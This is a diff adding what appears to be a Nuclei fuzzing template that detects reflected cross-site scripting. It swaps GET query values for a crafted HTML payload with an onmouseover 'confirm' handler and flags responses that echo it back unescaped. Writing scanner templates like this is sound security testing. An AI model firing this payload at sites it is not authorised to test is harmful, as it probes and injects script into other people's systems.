@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-xhzeem
+
+info:
+  name: XSS Test with Custom Payload
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a custom payload targeting the xhzeem attribute.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss_payload:
+        - "<xhzeem attr=\" --- x=\"=='='onmouseover=confirm\`xhzeem\` style=\"display:block;width:1000px;height:1000px;background:red\"> --- \">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss_payload}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
